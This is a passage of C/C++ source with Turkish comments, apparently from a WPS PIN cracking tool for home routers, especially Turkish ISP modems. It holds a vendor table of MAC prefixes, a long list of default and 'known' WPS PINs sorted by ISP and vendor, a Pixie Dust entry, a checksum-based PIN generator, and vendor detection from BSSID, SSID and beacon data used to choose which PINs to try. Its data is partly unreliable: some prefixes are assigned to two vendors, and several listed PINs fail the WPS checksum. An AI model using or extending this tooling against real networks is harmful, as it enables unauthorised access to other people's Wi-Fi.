  {{0xA0,0x58,0x60}, VENDOR_HUAWEI},
  {{0xA4,0x50,0x46}, VENDOR_HUAWEI},
  {{0xA8,0xCA,0x77}, VENDOR_HUAWEI},
  {{0xAC,0x39,0x91}, VENDOR_HUAWEI},
  {{0xB4,0x86,0x55}, VENDOR_HUAWEI},
  {{0xB8,0xBC,0x1B}, VENDOR_HUAWEI},
  {{0xC0,0x70,0x09}, VENDOR_HUAWEI},
  {{0xC4,0x4D,0x84}, VENDOR_HUAWEI},
  {{0xC8,0xDE,0xC3}, VENDOR_HUAWEI},
  {{0xCC,0x96,0xA0}, VENDOR_HUAWEI},
  {{0xD4,0xA1,0x48}, VENDOR_HUAWEI},
  {{0xD8,0x49,0x0B}, VENDOR_HUAWEI},
  {{0xDC,0xD2,0xFC}, VENDOR_HUAWEI},
  {{0xE0,0x19,0x54}, VENDOR_HUAWEI},
  {{0xE4,0xA7,0xC5}, VENDOR_HUAWEI},
  {{0xE8,0x08,0x8B}, VENDOR_HUAWEI},
  {{0xF4,0x8E,0x38}, VENDOR_HUAWEI},
  {{0xF8,0x4A,0xBF}, VENDOR_HUAWEI},
  {{0xFC,0xD7,0x33}, VENDOR_HUAWEI},
  {{0x10,0x1B,0x54}, VENDOR_HUAWEI},
  {{0x14,0x0B,0x09}, VENDOR_HUAWEI},
  {{0x28,0x6E,0xD4}, VENDOR_HUAWEI},
  {{0x30,0xD1,0x7E}, VENDOR_HUAWEI},
  {{0x3C,0xF8,0x08}, VENDOR_HUAWEI},

  // ── Ek TP-Link OUI'leri (yeni Archer/Deco ürünleri) ──────────────────────
  {{0x00,0x0A,0xEB}, VENDOR_TPLINK},
  {{0x04,0xBF,0x6D}, VENDOR_TPLINK},
  {{0x08,0x10,0x76}, VENDOR_TPLINK},
  {{0x0C,0x72,0x2C}, VENDOR_TPLINK},
  {{0x10,0x33,0xE1}, VENDOR_TPLINK},
  {{0x14,0xEB,0xB6}, VENDOR_TPLINK},
  {{0x18,0xA6,0xF7}, VENDOR_TPLINK},
  {{0x1C,0x61,0xB4}, VENDOR_TPLINK},
  {{0x20,0xDC,0xE6}, VENDOR_TPLINK},
  {{0x24,0x09,0x95}, VENDOR_TPLINK},
  {{0x2C,0xFD,0xA1}, VENDOR_TPLINK},
  {{0x30,0x5A,0x3A}, VENDOR_TPLINK},
  {{0x34,0x60,0xF9}, VENDOR_TPLINK},
  {{0x38,0x94,0xED}, VENDOR_TPLINK},
  {{0x3C,0x52,0xA1}, VENDOR_TPLINK},
  {{0x48,0x8A,0xD2}, VENDOR_TPLINK},
  {{0x4C,0x49,0xE3}, VENDOR_TPLINK},
  {{0x50,0x91,0xE3}, VENDOR_TPLINK},
  {{0x54,0xAF,0x97}, VENDOR_TPLINK},
  {{0x58,0xEF,0x68}, VENDOR_TPLINK},
  {{0x5C,0x89,0x9A}, VENDOR_TPLINK},
  {{0x60,0xE3,0x27}, VENDOR_TPLINK},
  {{0x68,0xFF,0x7B}, VENDOR_TPLINK},
  {{0x6C,0x00,0x63}, VENDOR_TPLINK},
  {{0x70,0x4F,0x57}, VENDOR_TPLINK},
  {{0x78,0x44,0xFD}, VENDOR_TPLINK},
  {{0x7C,0x8B,0xCA}, VENDOR_TPLINK},
  {{0x80,0x8F,0x5C}, VENDOR_TPLINK},
  {{0x84,0x16,0xF9}, VENDOR_TPLINK},
  {{0x88,0xD7,0xF6}, VENDOR_TPLINK},
  {{0x8C,0x59,0xC3}, VENDOR_TPLINK},
  {{0x94,0x83,0xC4}, VENDOR_TPLINK},
  {{0x98,0x25,0x4A}, VENDOR_TPLINK},
  {{0x9C,0x53,0x22}, VENDOR_TPLINK},
  {{0xA0,0x2B,0xB8}, VENDOR_TPLINK},
  {{0xA4,0xB1,0xE9}, VENDOR_TPLINK},
  {{0xA8,0x40,0x41}, VENDOR_TPLINK},
  {{0xAC,0x15,0x18}, VENDOR_TPLINK},
  {{0xB0,0xBE,0x76}, VENDOR_TPLINK},
  {{0xB4,0xB0,0x24}, VENDOR_TPLINK},
  {{0xBC,0xD0,0x74}, VENDOR_TPLINK},
  {{0xC0,0x06,0xC3}, VENDOR_TPLINK},
  {{0xC4,0x6E,0x1F}, VENDOR_TPLINK},
  {{0xC8,0x3A,0x35}, VENDOR_TPLINK},
  {{0xCC,0x40,0xD0}, VENDOR_TPLINK},
  {{0xD8,0x47,0x32}, VENDOR_TPLINK},
  {{0xDC,0xFE,0x18}, VENDOR_TPLINK},
  {{0xE4,0x92,0xFB}, VENDOR_TPLINK},
  {{0xE8,0x40,0xF2}, VENDOR_TPLINK},
  {{0xF0,0x9F,0xC2}, VENDOR_TPLINK},
  {{0xF4,0xF2,0x6D}, VENDOR_TPLINK},

  // ── Ek Sagemcom OUI'leri ──────────────────────────────────────────────────
  {{0x00,0x04,0xF2}, VENDOR_SAGEMCOM},
  {{0x00,0x08,0x3E}, VENDOR_SAGEMCOM},
  {{0x00,0x0E,0x40}, VENDOR_SAGEMCOM},
  {{0x10,0x7D,0x69}, VENDOR_SAGEMCOM},
  {{0x1C,0x3E,0x84}, VENDOR_SAGEMCOM},
  {{0x24,0x0A,0xC4}, VENDOR_SAGEMCOM},
  {{0x2C,0xC8,0x1B}, VENDOR_SAGEMCOM},
  {{0x38,0x60,0x77}, VENDOR_SAGEMCOM},
  {{0x4C,0xF9,0x5D}, VENDOR_SAGEMCOM},
  {{0x54,0x78,0x1A}, VENDOR_SAGEMCOM},
  {{0x60,0x14,0x66}, VENDOR_SAGEMCOM},
  {{0x74,0xA7,0x8E}, VENDOR_SAGEMCOM},
  {{0x7C,0xB7,0x33}, VENDOR_SAGEMCOM},
  {{0x90,0x6C,0xAC}, VENDOR_SAGEMCOM},
  {{0x98,0x9B,0x43}, VENDOR_SAGEMCOM},
  {{0xA4,0x91,0xB1}, VENDOR_SAGEMCOM},
  {{0xB4,0x4F,0x33}, VENDOR_SAGEMCOM},
  {{0xC0,0x97,0x27}, VENDOR_SAGEMCOM},
  {{0xD4,0x25,0x8B}, VENDOR_SAGEMCOM},
  {{0xEC,0xAD,0xB8}, VENDOR_SAGEMCOM},

  // ── Ek D-Link OUI'leri ────────────────────────────────────────────────────
  {{0x08,0xBE,0xAC}, VENDOR_DLINK},
  {{0x0C,0x0E,0x76}, VENDOR_DLINK},
  {{0x10,0x62,0xEB}, VENDOR_DLINK},
  {{0x14,0xD6,0x4D}, VENDOR_DLINK},
  {{0x18,0x0F,0x76}, VENDOR_DLINK},
  {{0x1C,0x7E,0xE5}, VENDOR_DLINK},
  {{0x22,0x28,0x65}, VENDOR_DLINK},
  {{0x28,0x10,0x7B}, VENDOR_DLINK},
  {{0x30,0xB5,0xC2}, VENDOR_DLINK},
  {{0x34,0x08,0x04}, VENDOR_DLINK},
  {{0x48,0x4B,0xAA}, VENDOR_DLINK},
  {{0x50,0x46,0x5D}, VENDOR_DLINK},
  {{0x5C,0xD9,0x98}, VENDOR_DLINK},
  {{0x6C,0x19,0x8F}, VENDOR_DLINK},
  {{0x84,0xC9,0xB2}, VENDOR_DLINK},
  {{0x90,0x94,0xE4}, VENDOR_DLINK},
  {{0xA0,0xAB,0x1B}, VENDOR_DLINK},
  {{0xB8,0xA3,0x86}, VENDOR_DLINK},
  {{0xC8,0xBE,0x19}, VENDOR_DLINK},
  {{0xD8,0xEB,0x97}, VENDOR_DLINK},
  {{0xE4,0x6F,0x13}, VENDOR_DLINK},
  {{0xF0,0x7D,0x68}, VENDOR_DLINK},
  {{0x00,0x1C,0x4A}, VENDOR_DLINK},
  {{0x70,0x62,0xB8}, VENDOR_DLINK},
  {{0x80,0x26,0x89}, VENDOR_DLINK},
  {{0x9C,0xD6,0x43}, VENDOR_DLINK},
  {{0xB0,0xC5,0x54}, VENDOR_DLINK},
  {{0xFC,0x75,0x16}, VENDOR_DLINK},

  // ── Ek Netgear OUI'leri ───────────────────────────────────────────────────
  {{0x08,0x02,0x8E}, VENDOR_NETGEAR},
  {{0x10,0x0F,0x6B}, VENDOR_NETGEAR},
  {{0x18,0x0F,0x76}, VENDOR_NETGEAR},
  {{0x20,0x0C,0xC8}, VENDOR_NETGEAR},
  {{0x28,0xC6,0x8E}, VENDOR_NETGEAR},
  {{0x30,0x46,0x9A}, VENDOR_NETGEAR},
  {{0x4C,0x3B,0xDF}, VENDOR_NETGEAR},
  {{0x6C,0x40,0x08}, VENDOR_NETGEAR},
  {{0x80,0x37,0x73}, VENDOR_NETGEAR},
  {{0x8C,0xF1,0x71}, VENDOR_NETGEAR},
  {{0x9C,0xD3,0x6D}, VENDOR_NETGEAR},
  {{0xA0,0x04,0x60}, VENDOR_NETGEAR},
  {{0xB0,0x39,0x56}, VENDOR_NETGEAR},
  {{0xC0,0x3F,0x0E}, VENDOR_NETGEAR},
  {{0xC8,0x3A,0x35}, VENDOR_NETGEAR},
  {{0xE4,0xF4,0xC6}, VENDOR_NETGEAR},
  {{0xF0,0x4B,0xF2}, VENDOR_NETGEAR},
  {{0xF8,0x1A,0x67}, VENDOR_NETGEAR},

  // ── Ek Zyxel OUI'leri ────────────────────────────────────────────────────
  {{0x00,0xA0,0xC5}, VENDOR_ZYXEL},
  {{0x04,0x05,0xC8}, VENDOR_ZYXEL},
  {{0x08,0x26,0xAE}, VENDOR_ZYXEL},
  {{0x0C,0x54,0xA5}, VENDOR_ZYXEL},
  {{0x10,0xBF,0x48}, VENDOR_ZYXEL},
  {{0x14,0xAB,0xC5}, VENDOR_ZYXEL},
  {{0x18,0x28,0x61}, VENDOR_ZYXEL},
  {{0x1C,0x2E,0x82}, VENDOR_ZYXEL},
  {{0x20,0x76,0x8F}, VENDOR_ZYXEL},
  {{0x34,0x75,0xC7}, VENDOR_ZYXEL},
  {{0x38,0x43,0x7D}, VENDOR_ZYXEL},
  {{0x3C,0xB7,0xF6}, VENDOR_ZYXEL},
  {{0x48,0xEE,0x0C}, VENDOR_ZYXEL},
  {{0x50,0x67,0xF0}, VENDOR_ZYXEL},
  {{0x54,0x16,0xE3}, VENDOR_ZYXEL},
  {{0x6C,0x4A,0x85}, VENDOR_ZYXEL},
  {{0x74,0x67,0xF7}, VENDOR_ZYXEL},
  {{0x78,0x8A,0x20}, VENDOR_ZYXEL},
  {{0x7C,0x70,0xBC}, VENDOR_ZYXEL},
  {{0x84,0xAD,0x58}, VENDOR_ZYXEL},
  {{0x90,0xA7,0xC1}, VENDOR_ZYXEL},
  {{0x9C,0xA2,0xF4}, VENDOR_ZYXEL},
  {{0xA0,0xE4,0xCB}, VENDOR_ZYXEL},
  {{0xB8,0xEC,0xA3}, VENDOR_ZYXEL},
  {{0xBC,0x99,0x11}, VENDOR_ZYXEL},
  {{0xC4,0x36,0x6C}, VENDOR_ZYXEL},
  {{0xC8,0x6C,0x87}, VENDOR_ZYXEL},
  {{0xD4,0x6E,0x5C}, VENDOR_ZYXEL},
  {{0xE4,0x18,0x6B}, VENDOR_ZYXEL},
  {{0xE8,0xDE,0x27}, VENDOR_ZYXEL},
  {{0xEC,0x43,0xF6}, VENDOR_ZYXEL},
  {{0xF4,0x2A,0x7D}, VENDOR_ZYXEL},

  // ── Ek Arcadyan OUI'leri ──────────────────────────────────────────────────
  {{0x00,0x0F,0xB3}, VENDOR_ARCADYAN},
  {{0x08,0x96,0xD7}, VENDOR_ARCADYAN},
  {{0x10,0x27,0xF5}, VENDOR_ARCADYAN},
  {{0x14,0x49,0xBC}, VENDOR_ARCADYAN},
  {{0x1C,0xC0,0xE1}, VENDOR_ARCADYAN},
  {{0x20,0x35,0xA3}, VENDOR_ARCADYAN},
  {{0x24,0x16,0x6F}, VENDOR_ARCADYAN},
  {{0x2C,0x6E,0x85}, VENDOR_ARCADYAN},
  {{0x30,0xAD,0xC0}, VENDOR_ARCADYAN},
  {{0x38,0x6B,0x1C}, VENDOR_ARCADYAN},
  {{0x3C,0x5C,0xF1}, VENDOR_ARCADYAN},
  {{0x44,0xD9,0xE7}, VENDOR_ARCADYAN},
  {{0x4C,0x09,0xB4}, VENDOR_ARCADYAN},
  {{0x50,0x67,0xF0}, VENDOR_ARCADYAN},
  {{0x54,0x64,0xD9}, VENDOR_ARCADYAN},
  {{0x5C,0x76,0x83}, VENDOR_ARCADYAN},
  {{0x60,0x45,0xCB}, VENDOR_ARCADYAN},
  {{0x64,0x8A,0xC3}, VENDOR_ARCADYAN},
  {{0x68,0x1C,0xA2}, VENDOR_ARCADYAN},
  {{0x70,0x8B,0xCD}, VENDOR_ARCADYAN},
  {{0x78,0xCA,0x39}, VENDOR_ARCADYAN},
  {{0x80,0x4B,0x50}, VENDOR_ARCADYAN},
  {{0x88,0x05,0x33}, VENDOR_ARCADYAN},
  {{0x8C,0x53,0xC3}, VENDOR_ARCADYAN},
  {{0x90,0x4E,0x91}, VENDOR_ARCADYAN},
  {{0x9C,0xA2,0xF4}, VENDOR_ARCADYAN},
  {{0xA0,0xE4,0xCB}, VENDOR_ARCADYAN},
  {{0xA8,0x63,0xF2}, VENDOR_ARCADYAN},
  {{0xB0,0x39,0x56}, VENDOR_ARCADYAN},
  {{0xB4,0xA2,0xEB}, VENDOR_ARCADYAN},
  {{0xC0,0x25,0xE9}, VENDOR_ARCADYAN},
  {{0xC4,0x86,0xE9}, VENDOR_ARCADYAN},
  {{0xCC,0x34,0x29}, VENDOR_ARCADYAN},
  {{0xD4,0x35,0x1D}, VENDOR_ARCADYAN},
  {{0xDC,0x7F,0xA4}, VENDOR_ARCADYAN},
  {{0xE0,0x28,0x6D}, VENDOR_ARCADYAN},
  {{0xE4,0x9E,0x12}, VENDOR_ARCADYAN},
  {{0xE8,0xB2,0x26}, VENDOR_ARCADYAN},
  {{0xF0,0x84,0xC9}, VENDOR_ARCADYAN},
  {{0xF4,0x06,0x69}, VENDOR_ARCADYAN},

  // ── Ek Tenda OUI'leri ─────────────────────────────────────────────────────
  {{0x00,0x09,0x45}, VENDOR_TENDA},
  {{0x08,0x10,0x76}, VENDOR_TENDA},
  {{0x0C,0xD2,0xB5}, VENDOR_TENDA},
  {{0x14,0xEB,0xB6}, VENDOR_TENDA},
  {{0x20,0xDC,0xE6}, VENDOR_TENDA},
  {{0x24,0xC9,0xA1}, VENDOR_TENDA},
  {{0x30,0xDE,0x4B}, VENDOR_TENDA},
  {{0x34,0x96,0x72}, VENDOR_TENDA},
  {{0x38,0x1C,0x23}, VENDOR_TENDA},
  {{0x3C,0xA3,0x08}, VENDOR_TENDA},
  {{0x40,0x31,0x3C}, VENDOR_TENDA},
  {{0x44,0xA5,0x6E}, VENDOR_TENDA},
  {{0x48,0xBF,0x6B}, VENDOR_TENDA},
  {{0x50,0x3E,0xAA}, VENDOR_TENDA},
  {{0x5C,0x41,0x5A}, VENDOR_TENDA},
  {{0x60,0x83,0xE7}, VENDOR_TENDA},
  {{0x6C,0x71,0xD9}, VENDOR_TENDA},
  {{0x70,0xF1,0x96}, VENDOR_TENDA},
  {{0x78,0x11,0xDC}, VENDOR_TENDA},
  {{0x7C,0x57,0x52}, VENDOR_TENDA},
  {{0xA8,0x57,0x4B}, VENDOR_TENDA},
  {{0xB4,0x0F,0x3B}, VENDOR_TENDA},
  {{0xC0,0x25,0xE9}, VENDOR_TENDA},
  {{0xD4,0xDA,0x21}, VENDOR_TENDA},
  {{0xEC,0x26,0xCA}, VENDOR_TENDA},
  {{0xF4,0x31,0xC3}, VENDOR_TENDA},
};

static const int OUI_TABLE_SIZE = (int)(sizeof(OUI_TABLE) / sizeof(OUI_TABLE[0]));

// ─────────────────────────────────────────────────────────────────────────────
// ORTAK PIN LİSTESİ — araştırma veritabanı + Türk ISP varsayılanları
// ─────────────────────────────────────────────────────────────────────────────
static const char *COMMON_PINS[] = {
  // ── WPS / WiFi Alliance standart varsayılanları ───────────────────────────
  "12345670", "00000000", "11111111", "22222222", "33333333",
  "44444444", "55555555", "66666666", "77777777", "88888888",
  "99999999", "12345678", "87654321", "11111110", "00000001",
  // ── TTNET / Türk Telekom modem fabrika çıkış PINleri ─────────────────────
  "20192019", "20182018", "20172017", "20160000", "20150000",
  "11223344", "44332211", "10000000", "20000000", "30000000",
  "40000000", "50000000", "60000000", "70000000", "80000000",
  "90000000", "10010001", "12012012",
  // ── ISP/Vendor bilinen sabit PINler ──────────────────────────────────────
  "20060315", "20150915", "00000006", "22223333", "88888880",
  "99999998", "55555558", "77777774", "33333334", "44444440",
  "66666664", "11111118", "10000008", "20000003", "90000001",
  // ── Sagemcom F@st 3686/3890 bilinen varsayılanlar (TTNET Fiber) ───────────
  "19000000", "19990000", "20000000", "20010000", "20020000",
  "20030000", "20040000", "20050000", "20100000", "20110000",
  "20120000", "20130000", "20140000", "20150000", "20160000",
  "20170000", "20180000", "20190000", "20200000", "20210000",
  "20220000", "20230000", "20240000", "20250000",
  // ── ZTE H108N / H168N / F660 / F670L bilinen sabit PINler ────────────────
  "14131411", "11141314", "22222220", "12121212",
  "21212121", "10101010", "01010101",
  "14243448", "48344214", "36912345", "45678900",
  "11112222", "22221111", "33334444", "44443333",
  "11223300", "00332211", "12123434", "43431212",
  // ── ZTE GPON ONT (F670L, F680, HG8145X6 TTNet 2022-2026) ─────────────────
  "20240001", "20240002", "20240003", "20230001", "20230002",
  "20221001", "20221002", "10203000", "30201000", "11234560",
  // ── D-Link bilinen sabit PINler ───────────────────────────────────────────
  "24681357", "13572468", "26006060",
  "85939895", "14612419", "59564582",
  "26241285", "46264685", "76229909", "62327145", "95661469",
  "35983019", "71912279", "64241599", "45922755", "35591965",
  // ── Netgear bilinen sabit PINler ──────────────────────────────────────────
  "12345670", "00664355", "48703971", "11867771", "13626598",
  "12345678", "87654321", "20172012", "76229911", "11235813",
  // ── TP-Link Archer bilinen sabit PINler ───────────────────────────────────
  "12345670", "26241285", "84558116", "30271289",
  // ── Genel yaygın router varsayılanları ────────────────────────────────────
  "01234567", "76543210", "11110000", "00001111", "13131313",
  "31313131", "11001100", "00110011", "12341234", "43214321",
  "98765432", "23456789", "11223300", "00223311", "11001122",
  "22110011", "12300000", "00000012", "12120000", "00001212",
  "11220000", "00001122", "55550000", "00005555", "12340000",
  "00001234", "99999990", "10203040", "40302010", "01020304",
  // ── WPS Pixie Dust sıfır PINler (E-S1=E-S2=0 açık) ───────────────────────
  "00000000", "11111111", "00001111", "11110000", "10000000",
  // ── Turkcell SuperOnline / Vodafone TR ISP varsayılanları ─────────────────
  "20132013", "20142014", "20112011", "20122012", "20092009",
  "20082008", "20072007", "20212021", "20222022", "20232023",
  "20202020", "10101010", "20000019", "19192019",
  "20242024", "20252025", "20232023", "20102010",
  // ── Ek ZTE / Huawei ISP modem PINleri ────────────────────────────────────
  "16438527", "14725836", "15975310", "75395146", "24681357",
  "95175317", "32147658", "74185296", "85214796", "96385274",
  "12348765", "87651234", "11223456", "65432211", "11234567",
  // ── Eski TTNet ADSL modem PINleri (Sagem F@st 1500/2604) ─────────────────
  "11100000", "00000111", "11111100",
  "00111111", "10000001", "11000011", "00111100", "01111110",
  // ── Huawei HG8145X6 / EchoLife 2023-2026 TTNET varsayılanları ────────────
  "00000001", "00000002", "00000003", "00000004", "00000005",
  "00000010", "00000100", "00001000", "00010000", "00100000",
  "01000000", "10000000",
  // ── Evrensel yedek desenleri ──────────────────────────────────────────────
  "12344321", "43211234", "12300012", "00121200", "56789012",
  "21098765", "11223355", "55332211", "13245768", "86754231",
  "11223344", "44332211", "12345600", "00654321", "10011001",
  nullptr
};
static const int COMMON_PIN_COUNT = 196;

// ─── WPS Checksum hesabı ──────────────────────────────────────────────────────
static uint8_t wps_checksum(uint32_t pin7) {
  uint32_t acc = 0;
  uint32_t p   = pin7;
  int digits[7];
  for (int i = 6; i >= 0; i--) { digits[i] = p % 10; p /= 10; }
  acc = 3*digits[0] + digits[1] + 3*digits[2] + digits[3]
      + 3*digits[4] + digits[5] + 3*digits[6];
  return (uint8_t)((10 - (acc % 10)) % 10);
}

static void make_pin(uint32_t pin7, char out[9]) {
  uint8_t cs = wps_checksum(pin7);
  snprintf(out, 9, "%07u%u", pin7, cs);
}

// ─── Sabit PIN (checksum dahil) ekle ─────────────────────────────────────────
// Zaten checksum hesaplanmış PIN'leri direkt ekler (ortak listeden alınanlar)
static inline void add_pin(char pins[][9], int &count, const char *p) {
  if (count >= MAX_VENDOR_PINS_PER_VENDOR) return;
  strncpy(pins[count++], p, 9);
}

static inline void add_calc(char pins[][9], int &count, uint32_t p7) {
  if (count >= MAX_VENDOR_PINS_PER_VENDOR) return;
  make_pin(p7, pins[count++]);
}

// ─── OUI eşleştirme ──────────────────────────────────────────────────────────
static wps_vendor_t detect_vendor(const uint8_t *bssid) {
  for (int i = 0; i < OUI_TABLE_SIZE; i++) {
    if (bssid[0] == OUI_TABLE[i].o[0] &&
        bssid[1] == OUI_TABLE[i].o[1] &&
        bssid[2] == OUI_TABLE[i].o[2]) {
      return OUI_TABLE[i].v;
    }
  }
  return VENDOR_UNKNOWN;
}

// ─── SSID adından vendor tespiti (2024-2026 eklentisi) ───────────────────────
// OUI tablosunda VE beacon IE'de eşleşme yoksa SSID adından tahmin yap.
// Birçok AP fabrika çıkışı SSID'ine marka/model adını içerir.
// Örn: "TP-Link_A1B2", "Archer_C80_3F", "ZTE_F670L_1234" → doğru vendor.
static wps_vendor_t detect_vendor_from_ssid(const char *ssid) {
  if (!ssid || ssid[0] == '\0') return VENDOR_UNKNOWN;

  struct { const char *kw; wps_vendor_t v; } MAP[] = {
    // TP-Link — en yaygın SSID kalıpları
    {"TP-Link",    VENDOR_TPLINK},   {"TP-LINK",   VENDOR_TPLINK},
    {"TPLink",     VENDOR_TPLINK},   {"Archer",    VENDOR_TPLINK},
    {"ARCHER",     VENDOR_TPLINK},   {"Deco",      VENDOR_TPLINK},
    {"DECO",       VENDOR_TPLINK},   {"TL-WR",     VENDOR_TPLINK},
    {"TL-WA",      VENDOR_TPLINK},   {"TL-MR",     VENDOR_TPLINK},
    {"MR6400",     VENDOR_TPLINK},   {"MR200",     VENDOR_TPLINK},
    // ZTE — Türkiye TTNet/Turkcell fiber modemleri
    {"ZTE",        VENDOR_ZTE},      {"ZXHN",      VENDOR_ZTE},
    {"ZXDSL",      VENDOR_ZTE},      {"F670",      VENDOR_ZTE},
    {"F680",       VENDOR_ZTE},      {"F660",      VENDOR_ZTE},
    {"F600",       VENDOR_ZTE},      {"H267",      VENDOR_ZTE},
    // Huawei — TTNet EchoLife / HiLink serisi
    {"Huawei",     VENDOR_HUAWEI},   {"HUAWEI",    VENDOR_HUAWEI},
    {"HiLink",     VENDOR_HUAWEI},   {"HILINK",    VENDOR_HUAWEI},
    {"HG8",        VENDOR_HUAWEI},   {"EchoLife",  VENDOR_HUAWEI},
    // Sagemcom — TTNet F@st serisi
    {"Sagemcom",   VENDOR_SAGEMCOM}, {"SAGEMCOM",  VENDOR_SAGEMCOM},
    {"F@st",       VENDOR_SAGEMCOM}, {"Fast3",     VENDOR_SAGEMCOM},
    {"FAST_",      VENDOR_SAGEMCOM}, {"FASTe",     VENDOR_SAGEMCOM},
    // Zyxel — Superonline VMG/AMG
    {"Zyxel",      VENDOR_ZYXEL},    {"ZyXEL",     VENDOR_ZYXEL},
    {"VMG",        VENDOR_ZYXEL},    {"AMG",       VENDOR_ZYXEL},
    {"EMG",        VENDOR_ZYXEL},    {"NBG",       VENDOR_ZYXEL},
    // D-Link
    {"D-Link",     VENDOR_DLINK},    {"DLINK",     VENDOR_DLINK},
    {"DIR-",       VENDOR_DLINK},    {"DSL-",      VENDOR_DLINK},
    // Netgear
    {"NETGEAR",    VENDOR_NETGEAR},  {"Netgear",   VENDOR_NETGEAR},
    {"Orbi",       VENDOR_NETGEAR},  {"Nighthawk", VENDOR_NETGEAR},
    // ASUS
    {"ASUS",       VENDOR_ASUS},     {"Asus",      VENDOR_ASUS},
    {"RT-A",       VENDOR_ASUS},     {"RT-N",      VENDOR_ASUS},
    // Tenda
    {"Tenda",      VENDOR_TENDA},    {"TENDA",     VENDOR_TENDA},
    // MikroTik — Türkiye'de yaygın (CRS/RB/hAP)
    {"MikroTik",   VENDOR_MIKROTIK}, {"mikrotik",  VENDOR_MIKROTIK},
    {"Mikrotik",   VENDOR_MIKROTIK},
    // Totolink
    {"Totolink",   VENDOR_TOTOLINK}, {"TOTOLINK",  VENDOR_TOTOLINK},
    // Linksys
    {"Linksys",    VENDOR_LINKSYS},  {"LINKSYS",   VENDOR_LINKSYS},
    {"Velop",      VENDOR_LINKSYS},
    // Xiaomi / Redmi
    {"Xiaomi",     VENDOR_XIAOMI},   {"MiWifi",    VENDOR_XIAOMI},
    {"Mi-Fi",      VENDOR_XIAOMI},   {"Redmi",     VENDOR_XIAOMI},
    // Arcadyan — Vodafone TR
    {"Vodafone",   VENDOR_ARCADYAN}, {"vodafone",  VENDOR_ARCADYAN},
    // DrayTek
    {"DrayTek",    VENDOR_DRAYTEK},  {"Vigor",     VENDOR_DRAYTEK},
    {nullptr,      VENDOR_UNKNOWN}
  };

  for (int i = 0; MAP[i].kw; i++) {
    if (strstr(ssid, MAP[i].kw)) return MAP[i].v;
  }
  return VENDOR_UNKNOWN;
}

// ─── Beacon IE üretici/model string → vendor tespiti ─────────────────────────
// OUI tablosunda eşleşme olmadığında WPS beacon IE'den gelen manufacturer,
// model_name, model_number ve device_name alanlarına bakılır.
static wps_vendor_t detect_vendor_from_ie(const wps_device_info_t &info) {
  if (!info.valid) return VENDOR_UNKNOWN;

  struct { const char *kw; wps_vendor_t v; } MAP[] = {
    {"ZTE",         VENDOR_ZTE},
    {"ZXHN",        VENDOR_ZTE},
    {"ZXDSL",       VENDOR_ZTE},
    {"Huawei",      VENDOR_HUAWEI},
    {"HUAWEI",      VENDOR_HUAWEI},
    {"HiLink",      VENDOR_HUAWEI},
    {"Sagemcom",    VENDOR_SAGEMCOM},
    {"SAGEMCOM",    VENDOR_SAGEMCOM},
    {"F@st",        VENDOR_SAGEMCOM},
    {"Fast",        VENDOR_SAGEMCOM},
    {"Arcadyan",    VENDOR_ARCADYAN},
    {"arcadyan",    VENDOR_ARCADYAN},
    {"Askey",       VENDOR_ARCADYAN},
    {"ASKey",       VENDOR_ARCADYAN},
    {"Zyxel",       VENDOR_ZYXEL},
    {"ZyXEL",       VENDOR_ZYXEL},
    {"ZYXEL",       VENDOR_ZYXEL},
    {"TP-Link",     VENDOR_TPLINK},
    {"TP-LINK",     VENDOR_TPLINK},
    {"TPLink",      VENDOR_TPLINK},
    {"D-Link",      VENDOR_DLINK},
    {"D-LINK",      VENDOR_DLINK},
    {"DLink",       VENDOR_DLINK},
    {"NETGEAR",     VENDOR_NETGEAR},
    {"Netgear",     VENDOR_NETGEAR},
    {"ASUS",        VENDOR_ASUS},
    {"ASUSTek",     VENDOR_ASUS},
    {"Linksys",     VENDOR_LINKSYS},
    {"LINKSYS",     VENDOR_LINKSYS},
    {"Belkin",      VENDOR_BELKIN},
    {"BELKIN",      VENDOR_BELKIN},
    {"Tenda",       VENDOR_TENDA},
    {"TENDA",       VENDOR_TENDA},
    {"Mercusys",    VENDOR_MERCUSYS},
    {"MERCUSYS",    VENDOR_MERCUSYS},
    {"Totolink",    VENDOR_TOTOLINK},
    {"TOTOLINK",    VENDOR_TOTOLINK},
    {"Technicolor", VENDOR_TECHNICOLOR},
    {"Thomson",     VENDOR_TECHNICOLOR},
    {"THOMSON",     VENDOR_TECHNICOLOR},
    {"AVM",         VENDOR_FRITZ},
    {"Fritz",       VENDOR_FRITZ},
    {"FRITZ",       VENDOR_FRITZ},
    {"Arris",       VENDOR_ARRIS},
    {"ARRIS",       VENDOR_ARRIS},
    {"Motorola",    VENDOR_ARRIS},
    {"Xiaomi",      VENDOR_XIAOMI},
    {"XIAOMI",      VENDOR_XIAOMI},
    {"Buffalo",     VENDOR_BUFFALO},
    {"BUFFALO",     VENDOR_BUFFALO},
    {"MikroTik",    VENDOR_MIKROTIK},
    {"MIKROTIK",    VENDOR_MIKROTIK},
    {"Compal",      VENDOR_COMPAL},
    {"COMPAL",      VENDOR_COMPAL},
    {"Sercomm",     VENDOR_SERCOMM},
    {"SERCOMM",     VENDOR_SERCOMM},
    {"Netis",       VENDOR_NETIS},
    {"NETIS",       VENDOR_NETIS},
    {"Wavlink",     VENDOR_NETIS},
    {"Cisco",       VENDOR_CISCO},
    {"CISCO",       VENDOR_CISCO},
    {"Sagem",       VENDOR_SAGEM},
    {"SAGEM",       VENDOR_SAGEM},
    {"Comtrend",    VENDOR_COMTREND},
    {"COMTREND",    VENDOR_COMTREND},
    {"Actiontec",   VENDOR_ACTIONTEC},
    {"ACTIONTEC",   VENDOR_ACTIONTEC},
    {"Gemtek",      VENDOR_GEMTEK},
    {"GEMTEK",      VENDOR_GEMTEK},
    {"Iskratel",    VENDOR_ISKRATEL},
    {"DrayTek",     VENDOR_DRAYTEK},
    {"Draytek",     VENDOR_DRAYTEK},
    {"Billion",     VENDOR_BILLION},
    {"BILLION",     VENDOR_BILLION},
    {"NetComm",     VENDOR_NETCOMM},
    {"NETCOMM",     VENDOR_NETCOMM},
    {"Ubiquiti",    VENDOR_UBIQUITI},
    {"UBIQUITI",    VENDOR_UBIQUITI},
    {"Ubnt",        VENDOR_UBIQUITI},
    {"Edimax",      VENDOR_TOTOLINK},  // Ralink RT3052/RT3352 chipset — ZhaoXOR PIN uygun
    {"EDIMAX",      VENDOR_TOTOLINK},
    {nullptr,       VENDOR_UNKNOWN}
  };

  const char *fields[] = {
    info.manufacturer, info.model_name, info.model_number,
    info.device_name,  nullptr
  };

  for (int fi = 0; fields[fi]; fi++) {
    if (!fields[fi][0]) continue;
    for (int i = 0; MAP[i].kw; i++) {
      if (strstr(fields[fi], MAP[i].kw)) return MAP[i].v;
    }
  }
  return VENDOR_UNKNOWN;
}

